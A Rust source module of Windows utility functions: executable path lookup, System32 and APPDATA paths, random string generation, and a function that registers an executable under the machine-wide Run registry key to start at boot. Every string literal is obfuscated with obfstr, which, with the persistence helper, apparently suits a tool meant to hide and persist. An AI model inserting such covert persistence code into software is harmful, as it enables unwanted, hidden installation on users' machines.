use std::{ env, path::PathBuf };
use anyhow::{ Context, Result };
use obfstr::obfstr as s;
use rand::{ distributions::Alphanumeric, Rng };
use winreg::{ enums::HKEY_LOCAL_MACHINE, RegKey };

pub fn get_current_exe_dir() -> Result<PathBuf> {
    let exe_path_buf = env::current_exe().context(s!("env::current_exe() failed").to_string())?;
    let current_dir = exe_path_buf
        .parent()
        .context(s!("parent is none for current exe path").to_string())?
        .to_path_buf();

    Ok(current_dir)
}

pub fn get_current_exe() -> Result<String> {
    let exe_path_buf = env::current_exe().context(s!("env::current_exe() failed").to_string())?;
    let exe_path = exe_path_buf
        .to_str()
        .context(s!("failed to convert exe PathBuf to &str").to_string())?
        .to_string();

    Ok(exe_path)
}
pub fn system32_dir() -> PathBuf {
    let system_root = env::var(s!("SystemRoot")).unwrap_or(s!(r"C:\Windows").to_string());
    PathBuf::from(system_root).join(s!("System32"))
}
pub fn current_appdata_dir() -> String {
    env::var(s!("APPDATA")).unwrap_or(s!("%APPDATA%").to_owned())
}

pub fn add_to_startup_global(name: &str, exe_location: String) -> Result<()> {
    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
    let path = s!(r"Software\Microsoft\Windows\CurrentVersion\Run").to_string();

    let (key, _) = hkcu
        .create_subkey(path)
        .context(s!("failed to create subkey in registry").to_string())?;

    key.set_value(name, &exe_location).context(s!("failed to set value in registry").to_string())?;
    Ok(())
}
pub fn generate_random_string(length: usize) -> String {
    let mut rng = rand::thread_rng();
    let random_string: String = (0..length).map(|_| rng.sample(Alphanumeric) as char).collect();

    random_string
}
